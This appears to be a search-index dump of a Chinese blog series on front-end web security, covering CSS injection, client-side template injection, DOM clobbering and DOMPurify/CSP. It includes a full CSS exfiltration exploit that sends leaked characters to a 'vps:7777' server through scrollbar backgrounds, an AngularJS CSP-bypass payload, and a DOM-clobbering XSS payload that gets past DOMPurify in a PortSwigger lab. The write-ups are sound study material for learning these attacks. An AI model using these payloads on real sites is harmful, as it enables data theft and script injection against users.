\u0026lt;div\u0026gt;CBAD\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这个时候我们让div只能显示出一个字符，再让first-line变30px，所以就只会出现第一个字符。 然后搭配上面的方法，我们就可以利用高度差发送request到我们的server：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+43; } div { font-size: 0px; height: 40px; width: 20px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; --leak: url(http://vps:7777?C=C); } div::first-line{ font-size: 30px; } div::-webkit-scrollbar { background: blue; } div::-webkit-scrollbar:vertical { background: var(--leak); } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;CBAD\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 可以看到确实可以这样子做，接下来我们只需要调整宽度就行，然后可以用CSS animation 不断载入不同的font-family 以及指定不同的--leak变数。 最后，写了一个完整的exp，大家可以本地跑一下\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face{font-family:has_A;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+41;font-style:monospace;} @font-face{font-family:has_B;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+42;font-style:monospace;} @font-face{font-family:has_C;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+43;font-style:monospace;} @font-face{font-family:has_D;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+44;font-style:monospace;} @font-face{font-family:has_E;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+45;font-style:monospace;} @font-face{font-family:has_F;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+46;font-style:monospace;} @font-face{font-family:has_G;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+47;font-style:monospace;} @font-face{font-family:has_H;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+48;font-style:monospace;} @font-face{font-family:has_I;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+49;font-style:monospace;} @font-face{font-family:has_J;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+4a;font-style:monospace;} @font-face{font-family:has_K;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+4b;font-style:monospace;} @font-face{font-family:has_L;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+4c;font-style:monospace;} @font-face{font-family:has_M;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+4d;font-style:monospace;} @font-face{font-family:has_N;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+4e;font-style:monospace;} @font-face{font-family:has_O;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+4f;font-style:monospace;} @font-face{font-family:has_P;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+50;font-style:monospace;} @font-face{font-family:has_Q;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+51;font-style:monospace;} @font-face{font-family:has_R;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+52;font-style:monospace;} @font-face{font-family:has_S;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+53;font-style:monospace;} @font-face{font-family:has_T;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+54;font-style:monospace;} @font-face{font-family:has_U;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+55;font-style:monospace;} @font-face{font-family:has_V;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+56;font-style:monospace;} @font-face{font-family:has_W;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+57;font-style:monospace;} @font-face{font-family:has_X;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+58;font-style:monospace;} @font-face{font-family:has_Y;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+59;font-style:monospace;} @font-face{font-family:has_Z;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+5a;font-style:monospace;} @font-face{font-family:has_0;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+30;font-style:monospace;} @font-face{font-family:has_1;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+31;font-style:monospace;} @font-face{font-family:has_2;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+32;font-style:monospace;} @font-face{font-family:has_3;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+33;font-style:monospace;} @font-face{font-family:has_4;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+34;font-style:monospace;} @font-face{font-family:has_5;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+35;font-style:monospace;} @font-face{font-family:has_6;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+36;font-style:monospace;} @font-face{font-family:has_7;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+37;font-style:monospace;} @font-face{font-family:has_8;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+38;font-style:monospace;} @font-face{font-family:has_9;src:local(\u0026#39;Comic Sans MS\u0026#39;);unicode-range:U+39;font-style:monospace;} @font-face{font-family:rest;src: local(\u0026#39;Courier New\u0026#39;);font-style:monospace;unicode-range:U+0-10FFFF} div { font-size: 0px; height: 40px; width: 0px; font-family: reset; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; animation: loop step-end 200s 0s, trychar step-end 2s 0s; animation-iteration-count: 1, infinite; } @keyframes trychar { 0% { font-family: rest; } /* delay for width change */ 5% { font-family: has_A, rest; --leak: url(?a); } 6% { font-family: rest; } 10% { font-family: has_B, rest; --leak: url(?b); } 11% { font-family: rest; } 15% { font-family: has_C, rest; --leak: url(?c); } 16% { font-family: rest } 20% { font-family: has_D, rest; --leak: url(?d); } 21% { font-family: rest; } 25% { font-family: has_E, rest; --leak: url(?e); } 26% { font-family: rest; } 30% { font-family: has_F, rest; --leak: url(?f); } 31% { font-family: rest; } 35% { font-family: has_G, rest; --leak: url(?g); } 36% { font-family: rest; } 40% { font-family: has_H, rest; --leak: url(?h); } 41% { font-family: rest } 45% { font-family: has_I, rest; --leak: url(?i); } 46% { font-family: rest; } 50% { font-family: has_J, rest; --leak: url(?j); } 51% { font-family: rest; } 55% { font-family: has_K, rest; --leak: url(?k); } 56% { font-family: rest; } 60% { font-family: has_L, rest; --leak: url(?l); } 61% { font-family: rest; } 65% { font-family: has_M, rest; --leak: url(?m); } 66% { font-family: rest; } 70% { font-family: has_N, rest; --leak: url(?n); } 71% { font-family: rest; } 75% { font-family: has_O, rest; --leak: url(?o); } 76% { font-family: rest; } 80% { font-family: has_P, rest; --leak: url(?p); } 81% { font-family: rest; } 85% { font-family: has_Q, rest; --leak: url(?q); } 86% { font-family: rest; } 90% { font-family: has_R, rest; --leak: url(?r); } 91% { font-family: rest; } 95% { font-family: has_S, rest; --leak: url(?s); } 96% { font-family: rest; } } @keyframes loop { 0% { width: 0px } 1% { width: 20px } 2% { width: 40px } 3% { width: 60px } 4% { width: 80px } 4% { width: 100px } 5% { width: 120px } 6% { width: 140px } 7% { width: 0px } } div::first-line{ font-size: 30px; } div::-webkit-scrollbar { background: blue; } div::-webkit-scrollbar:vertical { background: var(--leak); } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;CBAD\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 本地跑一下就知道是怎么样的了\nligature+scrollbar #\r连字（ligature），在某些字型当中，会把一些特定的组合render 成连在一起的样子 这个应该很好理解，就是将两个字母组合在了一起，同样的他可以和前面的方法一样可以完全的把所有字符leak出来。\n结合以上的方法，我们甚至可以得到script的内容，只需要在css处加上\nhead, script { display: block; } 即可，接下来放出例子\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var secret = \u0026#34;abc123\u0026#34; \u0026lt;/script\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;script\u0026gt; var secret2 = \u0026#34;cba321\u0026#34; \u0026lt;/script\u0026gt; \u0026lt;svg\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;font horiz-adv-x=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;font-face font-family=\u0026#34;hack\u0026#34; units-per-em=\u0026#34;1000\u0026#34; /\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026#34;a\u0026#39; horiz-adv-x=\u0026#34;99999\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;/font\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;style\u0026gt; script { display: block; font-family:\u0026#34;hack\u0026#34;; white-space:n owrap; overflow-x: auto; width: 500px; background:lightblue; } script::-webkit-scrollbar { background: blue; } \u0026lt;/style\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 当出现\u0026quot;a的连字的时候就会宽度超宽，scrollbar 出现，和前面一样，利用scrollbar进行request即可 but这里我跑不出来了，也许是脚本有问题，但是这个思路的确是可以的\n总结 #\r在学习之前我真没想到一个小小的XSS能玩出这么多花样，前辈们真的是太强了，也要多多学习啊！\nreference: https://aszx87410.github.io/beyond-xss/ch3/css-injection/ https://aszx87410.github.io/beyond-xss/ch3/css-injection-2/ https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231 https://demo.vwzq.net/css2.html https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/\n","date":"30 August 2025","externalUrl":null,"permalink":"/posts/%E6%8E%A2%E7%B4%A2%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8day%E4%BA%94/","section":"Posts","summary":"","title":"探索前端安全Day(五)-CSS-Injection","type":"posts"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/tags/csti/","section":"Tags","summary":"","title":"CSTI","type":"tags"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/categories/front/","section":"Categories","summary":"","title":"Front","type":"categories"},{"content":"引言 #\r应该会注意到的吧，标题变了，因为后面会讲到CSTI和SSTI的东西，所以就改成了前端安全，悄悄话：其实之前的原型链污染也有的，但是之前写过了就不想再写一遍了\n简要 #\rCSTI，全名为Client Side Template Injection，我们在CTF中比较常见到SSTI，但是很少见到CSTI也就是前端模板注入，难道前端也有模板？有的兄弟有的。\nClient Side Template Injection #\r这里用Angular举例，因为后面刚好有一个CTF的例子可以让大家更好理解。\n// import required packages\rimport \u0026#39;zone.js\u0026#39;;\rimport { Component } from \u0026#39;@angular/core\u0026#39;;\rimport { bootstrapApplication } from \u0026#39;@angular/platform-browser\u0026#39;;\r// describe component\r@Component({\rselector: \u0026#39;add-one-button\u0026#39;, // component name used in markup\rstandalone: true, // component is self-contained\rtemplate: // the component\u0026#39;s markup\r`\r\u0026lt;button (click)=\u0026#34;count = count + 1\u0026#34;\u0026gt;Add one\u0026lt;/button\u0026gt; {{ count }}\r`,\r})\r// export component\rexport class AddOneButtonComponent {\rcount = 0;\r}\rbootstrapApplication(AddOneButtonComponent); 很清晰能看到有一个template的参数，其中被设置为一个button标签，{{ count }}改成{{ constructor.constructor('alert(1)')() }}就会变成xss，不用window是因为模板里面没办法直接拿到window，所以如果让attacker可控template的话就会很麻烦。\nAngularJS+CSP bypass #\r\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src https://cdnjs.cloudflare.com\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div ng-app ng-csp\u0026gt; \u0026lt;input id=x autofocus ng-focus=$event.composedPath()|orderBy:\u0026#39;(z=alert)(1)\u0026#39;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这个和前面绕CSP的时候讲过的差不多，就是利用了cdn里面library的洞来进行绕过，刚好AngularJS就是这一类（小本本记起来） 这里就拿一道题目举例子\nGoogle CTF 2023-noteninja #\r附件地址： https://github.com/google/google-ctf/tree/main/2023/quals/web-noteninja 因为附件用的是k8s写的，我这边没环境，所以我们就直接看源码吧\n这里先空着吧，后面再来分析。\n","date":"30 August 2025","externalUrl":null,"permalink":"/posts/%E6%8E%A2%E7%B4%A2%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8day%E5%9B%9B/","section":"Posts","summary":"","title":"探索前端安全Day(四)-CSTI","type":"posts"},{"content":"","date":"28 August 2025","externalUrl":null,"permalink":"/tags/dom/","section":"Tags","summary":"","title":"DOM","type":"tags"},{"content":"","date":"28 August 2025","externalUrl":null,"permalink":"/categories/xss/","section":"Categories","summary":"","title":"XSS","type":"categories"},{"content":"","date":"28 August 2025","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"XSS","type":"tags"},{"content":"DOM与Window的关系 #\r当你在HTML设定了一个带有id的元素之后，你可以用window来得到他\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;button id=Test\u0026gt;click me!\u0026lt;/button\u0026gt; \u0026lt;script\u0026gt; console.log(window.Test) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 所以，比如说我要让他弹窗，正常来讲我们可以加一个EventListener，然后触发，像这样子\n\u0026lt;script\u0026gt; document.getElementById(\u0026#34;Test\u0026#34;) .addEventListener(\u0026#39;click\u0026#39;,()=\u0026gt;{ alert(1) }) \u0026lt;/script\u0026gt; 但是现在我们可以用一个最短的方式\nTest.onclick=()=\u0026gt;alert(1) 除了id可以这么用，其实还有另外一些标签也可以，可以看到spec html spec 所以除了id，还有img，form，embed和object可以这么去用。\n\u0026lt;embed name=\u0026#34;a\u0026#34;\u0026gt;\u0026lt;/embed\u0026gt; \u0026lt;form name=\u0026#34;b\u0026#34;\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;img name=\u0026#34;c\u0026#34; /\u0026gt; \u0026lt;object name=\u0026#34;d\u0026#34;\u0026gt;\u0026lt;/object\u0026gt; 所以，就是我们可以通过HTML去影响JS\nDOM clobbering #\r这里举一个攻击场景\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;留言板\u0026lt;/h1\u0026gt; \u0026lt;div\u0026gt; 你的留言：Hello DOM clobbering \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; if (window.TEST_MODE) { // load test script var script = document.createElement(\u0026#39;script\u0026#39;) script.src = window.TEST_SCRIPT_SRC document.body.appendChild(script) } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这里假设所有的xss代码都不起作用，只能更改html的情况下，如何才能攻击呢？ 我们前面提到我们可以通过id等信息去直接拿到window，所以我们只需要更改html对下面的值进行覆盖即可。 比如说这样子\n\u0026lt;div\u0026gt; 你的留言：\u0026lt;div id= \u0026#34;TEST_MODE\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;a id=\u0026#34;TEST_SCRIPT_SRC\u0026#34; href=\u0026#34;my_evil_script\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; 应该都看得懂，他就会把script的src读进来，那么比如我在本地写一个js，让他弹窗，我们可以试试 但是这里要注意一点，就是比如我要用console去把这个div的id拼接一个''可以看到他的输出就变为了： 看到输出的竟然不是字符串而是HTMLDivElement，原因是因为他并没有tostring的方法可以返回字符串，而我们可以查阅一下 看到只有a和href标签会有这个tostring，所以我们可以总结一下dom clobbering的使用场景是在：\nHTML可控并且JS中有利用到window之类的东西 用\u0026lt;a\u0026gt;搭配href 以及id 让元素toString之后变成我们想要的值 多层级 DOM clobbering #\r上面的例子是我们覆盖了单层的dom，那么是否可以覆盖多层的呢？ 这里的意思就我们可不可以这样子window.config.Test来覆盖Test呢 答案是可以的，我们这里用到了form标签即可\n\u0026lt;form id=\u0026#34;config\u0026#34;\u0026gt; \u0026lt;input name = \u0026#34;IsTest\u0026#34; /\u0026gt; \u0026lt;button id=\u0026#34;IsTest2\u0026#34;\u0026gt;click me!\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; console.log(window.config.IsTest) console.log(window.config.IsTest2) \u0026lt;/script\u0026gt; 但是注意这里是没有a标签可以用的，所以如果tostring的话，就没办法利用了，所以得搭配点东西利用，这个后面会说\n除了利用HTML 本身的层级以外，还可以利用另外一个特性：HTMLCollection。\n我们可以尝试这样子写(Firefox中只会输出第一个，所以我们用Chrome来看)\n\u0026lt;a id=\u0026#34;config\u0026#34;\u0026gt;aaaa\u0026lt;/a\u0026gt; \u0026lt;a id =\u0026#34;config\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;script\u0026gt; console.log(window.config) \u0026lt;/script\u0026gt; 那有了HTMLCollection之后可以做什么呢？在4.2.10.2. Interface HTMLCollection中有写到，可以利用name 或是id 去拿HTMLCollection里面的元素。 就像这样子，也可以和前面的造成一个结果，但是在firefox下是没办法这样子用的，要注意一下， 然后这里只有两层，如果要三层的话可以用form\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form id=\u0026#34;config\u0026#34;\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;form id=\u0026#34;config\u0026#34; name=\u0026#34;prod\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;apiUrl\u0026#34; value=\u0026#34;123\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; console.log(config.prod.apiUrl.value) //123 \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 如果你需要もっともっと层级，这个时候就可以用到万能iframe了\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe name=\u0026#34;config\u0026#34; srcdoc=\u0026#39; \u0026lt;a id=\u0026#34;apiUrl\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;script\u0026gt; setTimeout(() =\u0026gt; { console.log(config.apiUrl) // \u0026lt;a id=\u0026#34;apiUrl\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; }, 500) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这里记得要加上一个setTimeout因为iframe加载需要时间 如果你需要更多层级的话，可以使用这个好用的工具：DOM Clobber3r\n利用Document攻击 #\r直接上例子吧\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img name=cookie\u0026gt; \u0026lt;form id=test\u0026gt; \u0026lt;input name=lastElementChild\u0026gt; \u0026lt;div\u0026gt;I am last child\u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;embed name=getElementById\u0026gt;\u0026lt;/embed\u0026gt; \u0026lt;script\u0026gt; console.log(document.cookie) // \u0026lt;img name=\u0026#34;cookie\u0026#34;\u0026gt; console.log(document.querySelector(\u0026#39;#test\u0026#39;).lastElementChild) // \u0026lt;input name=lastElementChild\u0026gt; console.log(document.getElementById) // \u0026lt;embed name=getElementById\u0026gt;\u0026lt;/embed\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 我们利用了HTML 元素影响到了document，原本document.cookie应该是要显示cookie 的，现在却变成了\u0026lt;img name=cookie\u0026gt;这个元素，而lastElementChild原本应该要回传的是最后一个元素，却因为form 底下的name 会优先，因此抓到了同名的元素。\n最后的document.getElementById也可以被DOM 覆盖，如此一来呼叫document.getElementById()时就会出错，可以让整个页面crash。\nok那么我们现在可以打两个lab试试\nPortSwigger1 #\r我们进来可以看到这里有一个留言区，可以用html的格式 比如我们留一个h1的标签 可以看到是可以的，那么现在我们需要得到flag，如何利用dom clobbering呢？我们可以在源代码处看见\nfunction loadComments(postCommentPath) { let xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (this.readyState == 4 \u0026amp;\u0026amp; this.status == 200) { let comments = JSON.parse(this.responseText); displayComments(comments); } }; xhr.open(\u0026#34;GET\u0026#34;, postCommentPath + window.location.search); xhr.send(); function escapeHTML(data) { return data.replace(/[\u0026lt;\u0026gt;\u0026#39;\u0026#34;]/g, function(c){ return \u0026#39;\u0026amp;#\u0026#39; + c.charCodeAt(0) + \u0026#39;;\u0026#39;; }) } function displayComments(comments) { let userComments = document.getElementById(\u0026#34;user-comments\u0026#34;); for (let i = 0; i \u0026lt; comments.length; ++i) { comment = comments[i]; let commentSection = document.createElement(\u0026#34;section\u0026#34;); commentSection.setAttribute(\u0026#34;class\u0026#34;, \u0026#34;comment\u0026#34;); let firstPElement = document.createElement(\u0026#34;p\u0026#34;); let defaultAvatar = window.defaultAvatar || {avatar: \u0026#39;/resources/images/avatarDefault.svg\u0026#39;} let avatarImgHTML = \u0026#39;\u0026lt;img class=\u0026#34;avatar\u0026#34; src=\u0026#34;\u0026#39; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + \u0026#39;\u0026#34;\u0026gt;\u0026#39;; let divImgContainer = document.createElement(\u0026#34;div\u0026#34;); divImgContainer.innerHTML = avatarImgHTML if (comment.author) { if (comment.website) { let websiteElement = document.createElement(\u0026#34;a\u0026#34;); websiteElement.setAttribute(\u0026#34;id\u0026#34;, \u0026#34;author\u0026#34;); websiteElement.setAttribute(\u0026#34;href\u0026#34;, comment.website); firstPElement.appendChild(websiteElement) } let newInnerHtml = firstPElement.innerHTML + DOMPurify.sanitize(comment.author) firstPElement.innerHTML = newInnerHtml } if (comment.date) { let dateObj = new Date(comment.date) let month = \u0026#39;\u0026#39; + (dateObj.getMonth() + 1); let day = \u0026#39;\u0026#39; + dateObj.getDate(); let year = dateObj.getFullYear(); if (month.length \u0026lt; 2) month = \u0026#39;0\u0026#39; + month; if (day.length \u0026lt; 2) day = \u0026#39;0\u0026#39; + day; dateStr = [day, month, year].join(\u0026#39;-\u0026#39;); let newInnerHtml = firstPElement.innerHTML + \u0026#34; | \u0026#34; + dateStr firstPElement.innerHTML = newInnerHtml } firstPElement.appendChild(divImgContainer); commentSection.appendChild(firstPElement); if (comment.body) { let commentBodyPElement = document.createElement(\u0026#34;p\u0026#34;); commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body); commentSection.appendChild(commentBodyPElement); } commentSection.appendChild(document.createElement(\u0026#34;p\u0026#34;)); userComments.appendChild(commentSection); } } }; 我们先看到escapeHTML函数，这里他对尖括号以及引号做了转义，用了实体编码，也就是他这里自己写了一个dompurify的东西。当然他也加入了这个 所以显而易见，我们是没办法写xss的东西进去的，但是看到这里 这里利用了window.defaultAvatar，作为默认的avatar的值 并且拼接到了img标签内，最后放到了avatarImgHTML之中，然后innerHTML写入到了对应的div标签里面，所以我们着重看\nlet avatarImgHTML = \u0026#39;\u0026lt;img class=\u0026#34;avatar\u0026#34; src=\u0026#34;\u0026#39; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + \u0026#39;\u0026#34;\u0026gt;\u0026#39;; 然后他取的就是defaultAvatar.avatar下的值，所以这里就是一个两层的一个dom clobbering，所以我们可以构造\n\u0026lt;a id=defaultAvatar\u0026gt; \u0026lt;a id=defaultAvatar name=\u0026#34;avatar\u0026#34;href=...\u0026gt; 这样子就可以拿到href的值,然后我们闭合前面的，然后注释掉后面的即可\nhref=\u0026#39;\u0026#34;onerror=alert(1)// 事实上\u0026hellip;并没有触发 找一下哪里出了问题 似乎被dompurify拦了，可以看到最前面被转义成了%22，所以没办法触发这个xss，要利用一些办法把他给跳出来，重新看一遍源码，可以看到dompurify其实是有做白名单的 说不定我们可以利用这个，先试试tel放进去是什么效果 诶！！发现他确实可以写东西进去，并且双引号也理所应答加了进去，那么这个时候，是不是就可以闭合然后用onerror来触发了呢？\n\u0026lt;a id=defaultAvatar\u0026gt; \u0026lt;a id=defaultAvatar name= avatar href=\u0026#39;tel:\u0026#34;onerror=alert(111)\u0026#39;\u0026gt; 但是后面会有双引号把alert当做字符串使用了，那么我们只需要注释掉他即可。 最终exp\n\u0026lt;a id=defaultAvatar\u0026gt; \u0026lt;a id=defaultAvatar name=avatar href=\u0026#39;tel:\u0026#34;onerror=alert(1)//\u0026#39;\u0026gt; ","date":"28 August 2025","externalUrl":null,"permalink":"/posts/%E6%8E%A2%E7%B4%A2xss%E5%AE%89%E5%85%A8day%E4%B8%89/","section":"Posts","summary":"","title":"探索XSS安全DAY（三）-DOM-COLBBERING","type":"posts"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/csp/","section":"Tags","summary":"","title":"CSP","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/mxss/","section":"Tags","summary":"","title":"MXSS","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/sanitizer/","section":"Tags","summary":"","title":"Sanitizer","type":"tags"},{"content":"首发于奇安信攻防社区：https://forum.butian.net/share/4535\n引言 #\r不知道为啥，就是习惯写点这些东西来作为前置，基于我们第一天的学习，我们可以复盘一下，常见的xss可以用标签，事件处理器以及伪协议去触发，并且可以不包含空格和引号，甚至可以不使用尖括号便可以完成攻击，也可以利用实体编码来绕过，那么今天，我们来认识一个新的东西——Sanitization，是一种purify的玩意，我们经常看见的DOMpurify就是这种，他是可以把不符合规则的地方直接del掉。（本人写到这里的时候，才看见是这一章的第一篇，其实这里还有CSP等的绕过方式）\nSanitization #\r不要自作聪明？ #\r为什么把这段的主题写成这句话，也许是因为我们确实没办法很周全的考虑到各种绕过手法，所以建议用别人写好的的library，比如DOMpurify、DOMpurify、DOM\u0026hellip;.（XD，这个后面会讲 然后我们伟大的huli师傅举了一个很鲜明的例子，关于python中的BeautifulSoup\nfrom bs4 import BeautifulSoup html = \u0026#34;\u0026#34;\u0026#34; \u0026lt;div\u0026gt; test \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u0026lt;img src=x onerror=alert(1)\u0026gt; \u0026lt;/div\u0026gt; \u0026#34;\u0026#34;\u0026#34; tree = BeautifulSoup(html, \u0026#34;html.parser\u0026#34;) for element in tree.find_all(): print(f\u0026#34;name: {element.name}\u0026#34;) print(f\u0026#34;attrs: {element.attrs}\u0026#34;) 解析：\nname: div attrs: {} name: script attrs: {} name: img attrs: {\u0026#39;src\u0026#39;: \u0026#39;x\u0026#39;, \u0026#39;onerror\u0026#39;: \u0026#39;alert(1)\u0026#39;} but如果是这样子\nfrom bs4 import BeautifulSoup html=\u0026#34;\u0026#34;\u0026#34; \u0026lt;div\u0026gt; test \u0026lt;!--\u0026gt;\u0026lt;script\u0026gt;alert(1)--\u0026gt; \u0026lt;/div\u0026gt; \u0026#34;\u0026#34;\u0026#34; tree = BeautifulSoup(html,\u0026#34;html.parser\u0026#34;) for element in tree.find_all(): print(f\u0026#34;name: {element.name}\u0026#34;) print(f\u0026#34;attrs: {element.attrs}\u0026#34;) 这个时候的话，输出就只有\nname: div\rattrs: {} 但是浏览器会解析script触发xss，原因如下 也可以看这一篇： [HackTM CTF Qualifiers 2023 - Crocodilu）](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu#bypassing-html-sanitization)\n登场！DOMPurify #\r关于这个东西，感觉遇到的话都会觉得比较棘手 基本使用方法是\nconst clean = DOMPurify.sanitize(html); DOMPurify 预设允许的标签都是很安全的标签，像是\u0026lt;h1\u0026gt;、\u0026lt;p\u0026gt;、\u0026lt;div\u0026gt;以及\u0026lt;span\u0026gt;这种，而属性的话也会帮你把event handler 全部拿掉，之前讲到的javascript: 伪协议也是全部清掉，确保你放入任何HTML，在预设的情形下都不会有XSS。 所以来说这个东西防的还是比较死的，如果在题目中出现了，首先先排除是要你给个0day出来吧（感觉真的很难干） 当然，一般的话题目也会给出可以用的一些TAGS或者ATTR 类似于这种\nconst config = { ADD_TAGS:[\u0026#39;iframe\u0026#39;], ADD_ATTR:[\u0026#39;src\u0026#39;] } html = \u0026#39;\u0026lt;div\u0026gt;\u0026lt;iframe src=https://example.com\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;/div\u0026gt;\u0026#39; console.log(DOMPurify.sanitize(html,config)) CSP #\rCSP，全名为Content Security Policy，可以翻作「内容安全政策」，意思就是你可以帮自己的网页订立一些规范，跟浏览器说我的网页只允许符合这个规则的内容，不符合的都帮我挡掉。\n在网页上加载CSP有三种方式：\nHTTP response header Content-Security-Policy \u0026lt;meta\u0026gt;标签 \u0026lt;iframe\u0026gt;的csp 